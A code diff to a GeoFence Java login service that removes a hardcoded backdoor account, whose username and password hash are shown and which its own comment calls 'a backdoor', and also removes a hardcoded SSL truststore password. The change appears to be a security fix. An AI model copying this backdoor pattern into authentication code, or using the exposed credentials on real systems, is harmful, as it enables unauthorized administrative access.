@@ -92,16 +92,6 @@ public class LoginService implements ILoginService
 
         try
         {
-            URL url = Class.forName("it.geosolutions.geofence.gui.client.UserUI").getResource(
-                    "client.keystore");
-            String path = url.getPath();
-            if (logger.isDebugEnabled())
-            {
-                logger.debug(path);
-            }
-            System.setProperty("javax.net.ssl.trustStore", path);
-            System.setProperty("javax.net.ssl.trustStorePassword", "geosolutions");
-
             GFUser matchingUser = null;
             final Authentication authentication = SecurityContextHolder.getContext().getAuthentication();
             if (authentication != null && authentication.isAuthenticated())
@@ -128,13 +118,6 @@ public class LoginService implements ILoginService
                     logger.warn("User not found");
                     throw new ApplicationException("Login failed");
                 }
-            }
-            else if (userName.equals("1nt3rnAL-G30r3p0-admin"))
-            {
-                // a backdoor!?! :o
-                matchingUser = new GFUser();
-                matchingUser.setName(userName);
-                matchingUser.setPassword("2c6fe6e260312c5aa94ef0ca42b0af");
             }
             else
             {
@@ -174,11 +157,6 @@ public class LoginService implements ILoginService
                 grantedAuths = geofenceRemoteService.getLoginService().getGrantedAuthorities(token);
             }
 
-        }
-        catch (ClassNotFoundException e)
-        {
-            logger.error("Error :********** " + e.getMessage());
-            throw new ApplicationException(e);
         }
         catch (AuthException e)
         {
